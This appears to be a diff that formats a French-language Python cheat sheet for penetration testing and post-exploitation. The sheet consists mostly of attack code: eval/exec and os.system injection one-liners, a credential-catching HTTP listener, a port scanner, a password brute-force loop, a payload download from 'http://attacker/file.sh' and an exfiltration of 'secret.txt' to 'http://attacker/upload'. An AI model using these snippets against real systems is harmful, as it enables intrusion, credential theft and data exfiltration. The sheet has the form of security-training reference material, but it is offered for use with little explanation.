@@ -2,31 +2,45 @@
 
 ## 🔧 Lancement de serveurs
 
+```
 python3 -m http.server 8000  
+```
 > Démarre un serveur HTTP local sur le port 8000 (exfiltration, transfert de fichiers).  
 
+```
 python3 -m smtpd -c DebuggingServer -n localhost:1025  
+```
 > Lance un serveur SMTP local (utile en test d’email spoofing).
 
 ---
 
 ## 💉 Commandes utiles pour l’exploitation
 
+```
 import os  
 os.system("id")  
+```
 > Exécute une commande système.
 
+```
 import subprocess  
 subprocess.call(["ls", "-la"])  
+```
 > Exécution plus fine de commandes.
 
+```
 eval("__import__('os').system('id')")  
+```
 > Exemple d’injection dans un `eval()` vulnérable.
 
+```
 exec("__import__('os').system('whoami')")  
+```
 > Variante d’exécution arbitraire via `exec()`.
 
+```
 pickle.loads(payload)  
+```
 > Chargement de données malveillantes via Pickle (attention vulnérable si non contrôlé).
 
 ---
@@ -34,6 +48,7 @@ pickle.loads(payload)
 ## 🐍 Scripts utiles en post-exploitation
 
 # Serveur simple pour voler des creds (ex: LFI)
+```
 from http.server import BaseHTTPRequestHandler, HTTPServer  
 class Handler(BaseHTTPRequestHandler):  
   def do_GET(self):  
@@ -43,6 +58,7 @@ class Handler(BaseHTTPRequestHandler):
     self.wfile.write(b"OK")  
 
 HTTPServer(("0.0.0.0",8000), Handler).serve_forever()  
+```
 
 > Enregistre tout ce qui est demandé, très utile en LFI.
 
@@ -51,6 +67,7 @@ HTTPServer(("0.0.0.0",8000), Handler).serve_forever()
 ## 🔍 Analyse et bruteforce
 
 # Scanner de ports simple
+```
 import socket  
 for port in range(1,1025):  
   s = socket.socket()  
@@ -59,26 +76,33 @@ for port in range(1,1025):
   if result == 0:  
     print(f"Port {port} ouvert")  
   s.close()  
+```
 
 # Brute force simple
+```
 import requests  
 for pwd in ["admin", "1234", "password"]:  
   r = requests.post("http://target/login", data={"user":"admin", "pass":pwd})  
   if "Welcome" in r.text:  
     print("Mot de passe trouvé :", pwd)  
+```
 
 ---
 
 ## 📁 Téléchargement de fichiers
 
 # Télécharger un fichier via HTTP
+```
 import urllib.request  
 urllib.request.urlretrieve("http://attacker/file.sh", "file.sh")  
+```
 
 # Exfiltration d’un fichier
+```
 import requests  
 f = open("secret.txt", "rb")  
 r = requests.post("http://attacker/upload", files={"file": f})  
+```
 
 ---
 
@@ -96,22 +120,30 @@ r = requests.post("http://attacker/upload", files={"file": f})
 
 ## 🔐 Hash / Encodage
 
+```
 import base64  
 base64.b64encode(b"admin")  
+```
 > Encode une chaîne en Base64.  
 
+```
 import hashlib  
 hashlib.md5(b"admin").hexdigest()  
+```
 > Hash MD5 d'une chaîne (utile en cracking).  
 
 ---
 
 ## 🧠 Astuces
 
+```
 __import__('os').system('whoami')  
+```
 > Utile si on peut injecter du code Python dans une appli (SSTI, etc.).
 
+```
 type(variable), dir(variable), help(variable)  
+```
 > Très pratique en RE ou debug dans un environnement inconnu.
 
 ---
